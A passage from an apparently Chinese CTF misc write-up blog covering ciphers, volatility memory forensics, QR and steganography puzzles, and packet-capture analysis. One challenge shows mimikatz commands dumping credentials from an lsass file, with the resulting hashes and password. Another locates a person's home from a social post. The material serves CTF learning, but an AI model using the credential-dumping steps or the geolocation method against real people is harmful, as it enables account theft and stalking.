<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    string <span class="token operator">=</span><span class="token string">'=h3kllh0YNYIYJMFMBZxXmjzTTjzGmT3mNINEOgYgZVZsZx3z5j1'</span>
    n <span class="token operator">=</span> <span class="token number">5</span> <span class="token comment">#栏数</span>

    <span class="token comment">#若不知道栏数，则遍历所有可能</span>
    <span class="token comment"># crack_cipher(string)</span>

    <span class="token comment">#若知道栏数</span>
    array<span class="token punctuation">,</span>msg <span class="token operator">=</span> decode<span class="token punctuation">(</span>string<span class="token punctuation">,</span> n<span class="token punctuation">)</span>
    <span class="token comment"># array,msg = encode(string, n)</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> array<span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>

    flag <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>msg<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="栅栏密码"><a href="#栅栏密码" class="headerlink" title="栅栏密码"></a>栅栏密码</h3><h4 id="XMAN2018排位赛-通行证"><a href="#XMAN2018排位赛-通行证" class="headerlink" title="[XMAN2018排位赛]通行证"></a>[XMAN2018排位赛]通行证</h4><p>这道题目中的栅栏密码应该说是有点特殊的，要在<a target="_blank" rel="noopener" href="http://ctf.ssleye.com/railfence.html">在线詹栅栏密码</a>这个网站上进行key为7的加密才能得到正确的内容<code>kzna&#123;blnl_abj_lbh_trg_vg&#125;</code>，然后在进行凯撒密码</p>
<p><img src="/2021/05/28/CTF/image-20210804191048553.png" alt></p>
<pre class="line-numbers language-flag" data-language="flag"><code class="language-flag">xman&#123;oyay_now_you_get_it&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h2 id="内存取证"><a href="#内存取证" class="headerlink" title="内存取证"></a>内存取证</h2><h3 id="工具安装与使用"><a href="#工具安装与使用" class="headerlink" title="工具安装与使用"></a>工具安装与使用</h3><h4 id="volatility安装使用"><a href="#volatility安装使用" class="headerlink" title="volatility安装使用"></a>volatility安装使用</h4><h5 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h5><p><a target="_blank" rel="noopener" href="https://github.com/volatilityfoundation/volatility">GitHub该项目地址</a>，点击右边的Release带版本的最新的版本，也是18年的。。。</p>
<p><img src="/2021/05/28/CTF/image-20210809165342125.png" alt></p>
<p>这个volatility对应的是python2，而且如果是在ubuntu中环境也不好配置。</p>
<p><a target="_blank" rel="noopener" href="https://www.volatilityfoundation.org/26">官网地址</a>，也是最新的2.6的版本，然后直接下载下面图片中的这个文件即可，将文件解压后拉到kali中之后直接就能用了。</p>
<p><img src="/2021/05/28/CTF/image-20210809170151856.png" alt></p>
<p>然后为了在其他文件夹时也可以使用这个内存分析工具，这里需要将这个目录添加到系统环境变量之中。</p>
<pre class="line-numbers language-none"><code class="language-none"># 通过修改profile文件:
vim &#x2F;etc&#x2F;profile
# 修改为类似下面的这样
export PATH&#x3D;&#x2F;home&#x2F;m4xlmum&#x2F;misc&#x2F;volatility:$PATH<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>重启一下后，配置即可生效。</p>
<h5 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h5><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43431158/article/details/109462833">参考链接</a></p>
<pre class="line-numbers language-none"><code class="language-none"># 查看是什么系统的文件
volatility -f filename imageinfo

# 查看进程信息
volatility -f filename pslist --profile&#x3D;WinXPSP2x86

# 命令行扫描 ——cmdscan
volatility -f filename cmdscan --profile&#x3D;WinXPSP2x86

# 文件扫描 ——filescan
volatility -f filename filescan --profile&#x3D;WinXPSP2x86

# 查看notepad中的内容
volatility -f filename notepad --profile&#x3D;WinXPSP2x86

# 提取文件
volatility -f 1.raw  --profile&#x3D;Win7SP1x86 dumpfiles -Q 0x000000003e71e608 --dump-dir&#x3D;.&#x2F;
-Q的参数为 内存地址
--dump-dir的参数为导出文件的目录

# ie浏览器记录
iehistory

# 截屏
screenshot<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="社会工程学"><a href="#社会工程学" class="headerlink" title="社会工程学"></a>社会工程学</h2><h3 id="地图分析——BugKu社工-进阶收集"><a href="#地图分析——BugKu社工-进阶收集" class="headerlink" title="地图分析——BugKu社工-进阶收集"></a>地图分析——BugKu社工-进阶收集</h3><p>提　　示: flag{小美小区名字拼音}</p>
<p>描　　述: 小明当年为了追求小美想尽办法获得小美的地址。直到有一天小美发了一条说说，小明觉得希望来了。 (实战改编题，难度降低了。)</p>
<p>给出的附件内容如下所示</p>
<p><img src="/2021/05/28/CTF/qq.png" alt="附件"></p>
<p>首先看到那个塔是大雁塔，根据发帖的内容确定</p>
<ol>
<li>从发帖人家(附近的<strong>始发站</strong>)出发到大雁塔要做7站地铁。</li>
<li>该始发站距发帖人家的小区有800米</li>
<li>下一站距发帖人家1000多米。</li>
</ol>
<p>找到大雁塔附近的地铁路线图如下：</p>
<p><img src="/2021/05/28/CTF/20210219162217227.png" alt="西安地铁路线图"></p>
<p><img src="/2021/05/28/CTF/image-20210528200737880.png" alt="确定始发站为韦曲南站"></p>
<p>根据地铁线路图可以发现只有韦曲南站距离大雁塔的站点数为7并且中间又转乘(在小寨)了一站，故现在的条件为，发帖人家的小区距离韦曲南站有800米、距航天城1000多米。打开百度地图</p>
<p><img src="/2021/05/28/CTF/image-20210528201622601.png" alt="image-20210528201622601"></p>
<p>到目前为止，差不多一眼就能看出来了，很明显发帖人所在的小区就是兰乔国际城</p>
<p><img src="/2021/05/28/CTF/image-20210528201736743.png" alt="对距离的大概估算"></p>
<p><code>flag&#123;lanqiaoguojicheng&#125;</code></p>
<h2 id="二维码与拼图"><a href="#二维码与拼图" class="headerlink" title="二维码与拼图"></a>二维码与拼图</h2><h3 id="根据1、0生成二维码、二维码定位角补充——BugKu1和0的故事"><a href="#根据1、0生成二维码、二维码定位角补充——BugKu1和0的故事" class="headerlink" title="根据1、0生成二维码、二维码定位角补充——BugKu1和0的故事"></a>根据1、0生成二维码、二维码定位角补充——BugKu1和0的故事</h3><p>附件内容为</p>
<pre class="line-numbers language-data" data-language="data"><code class="language-data">0000000001110010000000000
0000000000011110100000000
0000000001110001000000000
0000000010111100000000000
0000000010101010000000000
0000000001100010100000000
0000000010101010100000000
0000000001000001100000000
1100011101110110100011000
0001000010110010010010100
0100111101000011101110011
0011110100101011001001001
1000001001100001001101000
1111000111111011100101000
1011011111001101111110111
1000110110010010101101100
1000111100111111111110111
0000000010110001100010100
0000000010010100101010001
0000000010101010100011001
0000000000100111111110010
0000000000011001011110111
0000000001001100100100001
0000000011000011011011001
0000000011010000101110101<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>猜测可能是个二维码的形状，打开python写一手转换代码。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt

<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"1和0的故事.txt"</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>
    content <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>
    res <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        res<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>content<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\\n'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\\r'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\''</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">25</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">25</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> res<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'1'</span><span class="token punctuation">:</span>
            plt<span class="token punctuation">.</span>scatter<span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">,</span> <span class="token number">250</span><span class="token punctuation">,</span> c<span class="token operator">=</span><span class="token string">'black'</span><span class="token punctuation">,</span> marker<span class="token operator">=</span><span class="token string">','</span><span class="token punctuation">)</span>

plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token comment"># 这个我后来又改了一下，这个我感觉是复原二维码来说最好用的</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/2021/05/28/CTF/image-20210529000305513.png" alt="得到下面的图像"></p>
<p>然后用ps添加一下二维码的三个角获得完整的二维码。</p>
<p>定位角如下</p>
<p><img src="/2021/05/28/CTF/image-20210528235634252.png" alt="定位角"></p>
<p>把定位角粘到二维码的三个角的地方就行了，或者使用windows 的画图程序也挺好使的其实，但是如果是拼图的话，画图可能就不是那么好使了。</p>
<p><img src="/2021/05/28/CTF/image-202105290003055132.png" alt="image-202105290003055132"></p>
<p>用手机qq勉强也是能扫出来flag的，就是我画的不太好看，用在线的网站都不行。。。<code>flag&#123;QR_c0de_1s_1nterest1n9&#125;</code></p>
<h2 id="特殊文件"><a href="#特殊文件" class="headerlink" title="特殊文件"></a>特殊文件</h2><h3 id="BugKu、easy-nbt"><a href="#BugKu、easy-nbt" class="headerlink" title="BugKu、easy_nbt"></a>BugKu、easy_nbt</h3><p>这个直接下载个文件的专用打开器，然后把New World文件夹拉入文件打开器search-&gt;value=flag。就找到flag了。</p>
<p><img src="/2021/05/28/CTF/image-20210530135639553.png" alt="image-20210530135639553"></p>
<p><code>flag&#123;Do_u_kN0w_nbt?&#125;</code></p>
<h3 id="buu、-WUSTCTF2020-爬"><a href="#buu、-WUSTCTF2020-爬" class="headerlink" title="buu、[WUSTCTF2020]爬"></a>buu、[WUSTCTF2020]爬</h3><p><strong>TAG:pdf隐写</strong></p>
<p>使用一般的txt浏览器看一眼是pdf的文件格式，直接把后缀名改为pdf，要修改pdf，这里找了很多pdf的编辑器都是没法使用，要会员什么的，这里用的是福昕pdf编辑器，虽然需要会员才可以保存，但是不需要会员就能编辑。这里我们只需要编辑的功能就可以了。</p>
<p><img src="/2021/05/28/CTF/image-20210803190718182.png" alt></p>
<p><img src="/2021/05/28/CTF/image-20210803190759861.png" alt></p>
<pre class="line-numbers language-none"><code class="language-none">0x77637466323032307b746831735f31735f405f7064665f616e645f7930755f63616e5f7573655f70686f7430736830707d

wctf2020&#123;th1s_1s_@_pdf_and_y0u_can_use_phot0sh0p&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<h2 id="文件内容隐藏"><a href="#文件内容隐藏" class="headerlink" title="文件内容隐藏"></a>文件内容隐藏</h2><p>这个一般是图片内部加入一些东西，ctf常见题型之一，其类型可能应归属于图片隐写。</p>
<h3 id="尾部藏文本"><a href="#尾部藏文本" class="headerlink" title="尾部藏文本"></a>尾部藏文本</h3><h4 id="unicode编码-BugKu、这是一张单纯的图片"><a href="#unicode编码-BugKu、这是一张单纯的图片" class="headerlink" title="unicode编码-BugKu、这是一张单纯的图片"></a>unicode编码-BugKu、这是一张单纯的图片</h4><p>是最简单的隐写题类型，直接在文件的尾部发现下面的内容</p>
<pre class="line-numbers language-none"><code class="language-none">&amp;#107;&amp;#101;&amp;#121;&amp;#123;&amp;#121;&amp;#111;&amp;#117;&amp;#32;&amp;#97;&amp;#114;&amp;#101;&amp;#32;&amp;#114;&amp;#105;&amp;#103;&amp;#104;&amp;#116;&amp;#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>这个内容一看就是unicode啊，再看都小于0xff，那就可以转ASCII码了，直接上拿手python</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">s <span class="token operator">=</span> <span class="token string">'&amp;#107;&amp;#101;&amp;#121;&amp;#123;&amp;#121;&amp;#111;&amp;#117;&amp;#32;&amp;#97;&amp;#114;&amp;#101;&amp;#32;&amp;#114;&amp;#105;&amp;#103;&amp;#104;&amp;#116;&amp;#125;'</span>
res1 <span class="token operator">=</span> s<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">';&amp;#'</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> res1<span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>
<span class="token comment"># key&#123;you are right&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>Unicode特征<code>&amp;#&#123;&#125;;</code>，大括号内的内容是数字。</p>
<h3 id="尾部藏文件"><a href="#尾部藏文件" class="headerlink" title="尾部藏文件"></a>尾部藏文件</h3><h4 id="outguess隐写、alison-likes-jojo"><a href="#outguess隐写、alison-likes-jojo" class="headerlink" title="outguess隐写、alison_likes_jojo"></a>outguess隐写、alison_likes_jojo</h4><p>没啥好说的，压缩包解压之后是两张图片，图片尾部发现zip文件的文件头<code>pk</code>，直接在winhex里面复制粘贴为zip文件后是个真加密的zip，爆破得口令为<code>888866</code>，解压这个压缩包得到内容</p>
<pre class="line-numbers language-data" data-language="data"><code class="language-data">WVRKc2MySkhWbmxqV0Zac1dsYzBQUT09<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>三次解base64之后得到后面的jpg文件的outguess隐写的key为</p>
<pre class="line-numbers language-flag" data-language="flag"><code class="language-flag">killerqueen<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>需要再对后面的jpg进行outguess，命令为</p>
<pre class="line-numbers language-command" data-language="command"><code class="language-command">outguess -k &#39;killerqueen&#39; -r &#39;jljy.jpg&#39; flag.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2021/05/28/CTF/image-20210601141030631.png" alt="image-20210601141030631"></p>
<p>得到flag</p>
<pre class="line-numbers language-flag" data-language="flag"><code class="language-flag">wctf2020&#123;pretty_girl_alison_likes_jojo&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h2 id="隐写"><a href="#隐写" class="headerlink" title="隐写"></a>隐写</h2><h3 id="修改PNG图片的宽高隐写"><a href="#修改PNG图片的宽高隐写" class="headerlink" title="修改PNG图片的宽高隐写"></a>修改PNG图片的宽高隐写</h3><h4 id="BugKu、隐写"><a href="#BugKu、隐写" class="headerlink" title="BugKu、隐写"></a>BugKu、隐写</h4><p>开局给了一张png图片，拖入winhex改宽高即可。</p>
<p>先查看文件的详细信息，找到图片的分辨率为<code>500 x 420</code>转成十六进制也就是<code>01F4 x 01A4</code>，在winhex中找到高度宽度位，修改高度位<code>01A4</code>为<code>02A4</code></p>
<p><img src="/2021/05/28/CTF/image-20210530143746251.png" alt="image-20210530143746251"></p>
<p><code>BUGKU&#123;a1e5aSA&#125;</code></p>
<h3 id="PNGのLSB最低位"><a href="#PNGのLSB最低位" class="headerlink" title="PNGのLSB最低位"></a>PNGのLSB最低位</h3><p>一般使用zsteg &amp;&amp; stegsolve &amp;&amp; python脚本解</p>
<pre class="line-numbers language-none"><code class="language-none"># zsteg使用方法
zsteg test.png
# 将内容分离到文件
zsteg test.png -E &quot;b1,rgb,lsb,xy&quot; &gt; 1.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="SUCTF-2019-Game"><a href="#SUCTF-2019-Game" class="headerlink" title="[SUCTF 2019]Game"></a>[SUCTF 2019]Game</h4><p><strong>TAG:zsteg使用、html、base64</strong></p>
<p>题目给的附件是两个文件，一个图片，一个有个html的src源代码文件，vscode打开html，发现</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token double-quoted-string string">"here is your flag:ON2WG5DGPNUECSDBNBQV6RTBNMZV6RRRMFTX2==="</span> <span class="token delimiter important">?></span></span>
suctf&#123;hAHaha_Fak3_F1ag&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>然后就是那个图片了，png考虑lsb，使用zsteg工具，</p>
<pre class="line-numbers language-none"><code class="language-none">┌──(m4xlmum㉿DESKTOP-MQAVU95)-[&#x2F;mnt&#x2F;c&#x2F;Users&#x2F;Administrator&#x2F;Desktop&#x2F;month&#x2F;6月ctf题目&#x2F;buuoj&#x2F;misc&#x2F;[SUCTF 2019]Game]
└─$ zsteg iZwz9i9xnerwj6o7h40eauZ.png
imagedata           .. text: &quot;*,+555\n\n\n&quot;
b1,r,lsb,xy         .. text: &quot;4QPz1&#123;wS?[P&quot;
b1,rgb,lsb,xy       .. file: openssl enc&#39;d data with salted password, base64 encoded
b2,r,lsb,xy         .. file: 0420 Alliant virtual executable common library not stripped
b3,r,lsb,xy         .. file: StarOffice Gallery theme \375\245N\333PNO\376\3017\026\003\360D\0055%\226Y$\237\3738\020\331\247\226\377-\226\331\177\004\020\233, 50397955 objects, 1st \001
b3,b,lsb,xy         .. text: &quot;Yx(7TRIc&quot;
b4,r,lsb,xy         .. text: &quot;gwfE#UU #Dwvh&quot;
b4,r,msb,xy         .. text: [&quot;\&quot;&quot; repeated 8 times]
b4,g,lsb,xy         .. text: &quot;vwvETgfRDw&quot;
b4,g,msb,xy         .. text: &quot;!!ffffffff&quot;
b4,b,lsb,xy         .. text: &quot;#EDEUEUEEx&quot;
b4,b,msb,xy         .. text: &quot;!!ffffffff&quot;
b4,rgb,lsb,xy       .. text: &quot;i%p$$sFG&quot;
b4,bgr,lsb,xy       .. text: &quot;Yeu$ t&amp;C&quot;
┌──(m4xlmum㉿DESKTOP-MQAVU95)-[&#x2F;mnt&#x2F;c&#x2F;Users&#x2F;Administrator&#x2F;Desktop&#x2F;month&#x2F;6月ctf题目&#x2F;buuoj&#x2F;misc&#x2F;[SUCTF 2019]Game]
└─$ zsteg iZwz9i9xnerwj6o7h40eauZ.png -E &quot;b1,rgb,lsb,xy&quot; &gt; 1.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>出来的<code>1.txt</code>文件的头部发现分组加密的内容</p>
<p><img src="/2021/05/28/CTF/image-20210606153006340.png" alt></p>
<pre class="line-numbers language-none"><code class="language-none">U2FsdGVkX1+zHjSBeYPtWQVSwXzcVFZLu6Qm0To&#x2F;KeuHg8vKAxFrVQ&#x3D;&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>以前面解得的fake flag作为密钥，解3DES可得flag</p>
<pre class="line-numbers language-none"><code class="language-none">suctf&#123;U_F0und_1t&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2021/05/28/CTF/image-20210606153135261.png" alt></p>
<h3 id="base64隐写"><a href="#base64隐写" class="headerlink" title="base64隐写"></a>base64隐写</h3><h2 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h2><h3 id="Telnet流量分析"><a href="#Telnet流量分析" class="headerlink" title="Telnet流量分析"></a>Telnet流量分析</h3><h4 id="Bugku、telnet"><a href="#Bugku、telnet" class="headerlink" title="Bugku、telnet"></a>Bugku、telnet</h4><p>给的流量包拖入wireshark打开跟踪流直接跟踪一段TCP流发现flag</p>
<p><img src="/2021/05/28/CTF/image-20210530145908225.png" alt="image-20210530145908225"></p>
<p><code>flag&#123;d316759c281bf925d600be698a4973d5&#125;</code></p>
<h3 id="http流量分析"><a href="#http流量分析" class="headerlink" title="http流量分析"></a>http流量分析</h3><h4 id="buu、百里挑一"><a href="#buu、百里挑一" class="headerlink" title="buu、百里挑一"></a>buu、百里挑一</h4><p>首先打开wireshark查看一下有什么数据都</p>
<p><img src="/2021/05/28/CTF/image-20210601230943606.png" alt="image-20210601230943606"></p>
<p>一看流量包瞬间明白出题人什么意思了，这是让从100多张图片里面选出来包含信息的那个啊，直接导出http对象。。。没啥用</p>
<p>用<code>exiftool *</code>，发现半拉flag。</p>
<p><img src="/2021/05/28/CTF/image-20210601232818680.png" alt="image-20210601232818680"></p>
<p><code>恭喜你！找到一半了，还有另一半哦！flag&#123;ae58d0408e26e8f</code>，另一半在wireshark里面<code>TCP流 114</code>，这里可以一个一个看，应该没啥简单的方法了。</p>
<p><img src="/2021/05/28/CTF/image-20210601233334032.png" alt="image-20210601233334032"></p>
<p><code>26a3c0589d23edeec&#125;</code></p>
<p><code>flag&#123;ae58d0408e26e8f26a3c0589d23edeec&#125;</code></p>
<h4 id="安洵杯-2019-Attack"><a href="#安洵杯-2019-Attack" class="headerlink" title="[安洵杯 2019]Attack"></a>[安洵杯 2019]Attack</h4><p>wireshark打开文件，稍微一追踪tcp流就知道这是某嗨客拿工具在扫目录，直接向后跳，到大约<code>819条数据</code>开始出现有用的数据，第824条数据出现关键字<code>flag.txt</code>，还有pk，应该是flag在压缩包里面，压缩包被嗨客下载下来了，导出所有http对象。但是里面并没有发现zip文件，只好使用foremost再分离一下。</p>
<p><img src="/2021/05/28/CTF/image-20210606114640134.png" alt></p>
<p>想起刚才导出http对象时有一个lsass文件，最近学域渗透恰巧知道了这个是windows里面存放开机口令的文件，可使用mimikatz来解析。</p>
<pre class="line-numbers language-none"><code class="language-none">sekurlsa::minidump lsass.dmp
sekurlsa::logonPasswords full<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>得</p>
<pre class="line-numbers language-none"><code class="language-none">Authentication Id : 0 ; 347784 (00000000:00054e88)
Session           : Interactive from 1
User Name         : Administrator
Domain            : WIN7
Logon Server      : WIN7
Logon Time        : 2019&#x2F;11&#x2F;14 9:38:33
SID               : S-1-5-21-1539156736-1959120456-2224594862-500
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : WIN7
         * LM       : c4d0515fb12046a475113b7737dc0019
         * NTLM     : aafdad330f5a9f4fbf562ed3d25f97de
         * SHA1     : 8b9a7ca86970d1392b6fa0b94b8694c2b919469f
        tspkg :
         * Username : Administrator
         * Domain   : WIN7
         * Password : W3lc0meToD0g3
        wdigest :
         * Username : Administrator
         * Domain   : WIN7
         * Password : W3lc0meToD0g3
        kerberos :
         * Username : Administrator
         * Domain   : WIN7
         * Password : W3lc0meToD0g3
        ssp :
        credman :

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 2019&#x2F;11&#x2F;14 9:35:06
SID               : S-1-5-19
        msv :
        tspkg :
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : WIN7$
Domain            : WORKGROUP
Logon Server      : (null)
Logon Time        : 2019&#x2F;11&#x2F;14 9:35:06
SID               : S-1-5-20
        msv :
        tspkg :
        wdigest :
         * Username : WIN7$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
         * Username : win7$
         * Domain   : WORKGROUP
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 48847 (00000000:0000becf)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 2019&#x2F;11&#x2F;14 9:35:04
SID               :
        msv :
        tspkg :
        wdigest :
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : WIN7$
Domain            : WORKGROUP
Logon Server      : (null)
Logon Time        : 2019&#x2F;11&#x2F;14 9:35:04
SID               : S-1-5-18
        msv :
        tspkg :
        wdigest :
         * Username : WIN7$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
         * Username : win7$
         * Domain   : WORKGROUP
         * Password : (null)
        ssp :
        credman :

mimikatz #<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>解一下压缩包得flag(口令为<code>W3lc0meToD0g3</code>)</p>
<pre class="line-numbers language-none"><code class="language-none">D0g3&#123;3466b11de8894198af3636c5bd1efce2&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h4 id="SUCTF2018-followme"><a href="#SUCTF2018-followme" class="headerlink" title="[SUCTF2018]followme"></a>[SUCTF2018]followme</h4><p>先导出http的对象，直接save all即可，注意到这是对密码有一个爆破的操作，一个文件一个文件地打开发现flag</p>
<p><img src="/2021/05/28/CTF/image-20210804183639765.png" alt></p>
<pre class="line-numbers language-flag" data-language="flag"><code class="language-flag">SUCTF&#123;password_is_not_weak&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="USB流量分析"><a href="#USB流量分析" class="headerlink" title="USB流量分析"></a>USB流量分析</h3><p>这个有个大佬写的比较方便的脚本</p>
<p><strong><a target="_blank" rel="noopener" href="https://github.com/WangYihang/UsbKeyboardDataHacker">UsbKeyboardDataHacker</a></strong></p>
<h4 id="BUUCTF、USB"><a href="#BUUCTF、USB" class="headerlink" title="BUUCTF、USB"></a>BUUCTF、USB</h4><p>题目给出了个rar文件还有个ftm的文件，将ftm文件用binwalk分离出key.pcap流量包，打开之后确实是usb的流量</p>
<p><img src="/2021/05/28/CTF/image-20210803235852673.png" alt></p>
<p>那就直接那脚本梭了。</p>
<p><img src="/2021/05/28/CTF/image-20210804000444335.png" alt></p>
<p>得到的内容为</p>
